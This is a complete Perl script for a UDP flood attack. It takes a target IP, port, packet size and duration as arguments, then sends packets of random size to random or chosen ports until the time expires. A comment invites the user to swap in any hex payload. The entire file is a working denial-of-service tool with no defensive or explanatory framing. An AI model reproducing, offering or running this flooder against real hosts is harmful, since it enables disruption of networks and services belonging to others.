
use Socket;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "perl <script>.pl <Target> <Port> <Packet Size> <Time>\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

# https://www.browserling.com/tools/utf8-to-hex

print "sending packets....\n";
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","put whatever payload you want in here. - it uses HEX ---> \x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03"), 0, pack_sockaddr_in($pport, $iaddr));}